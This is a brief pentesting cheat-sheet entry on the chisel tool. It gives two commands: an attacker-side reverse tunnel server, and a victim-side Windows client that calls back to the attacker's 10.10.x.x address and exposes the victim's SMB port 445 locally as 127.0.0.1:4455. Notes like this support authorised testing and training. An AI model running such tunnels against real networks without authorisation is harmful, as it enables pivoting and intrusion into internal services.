# chisel pivoting tunnel over http written in go

## usage: attacker open chisel server and victim connects as a client
redirects the victim's port 445 on my local machine as 127.0.0.1:4455
```cheat bash
attacker:
./chisel_linux_amd64 server -p 11111 -reverse -v

victim: 
.\chisel_windows_amd64.exe client 10.10.x.x:11111 R 127.0.0.1:4455:127.0.0.1:445

```

tags: #chisel #tunnel #pivot 
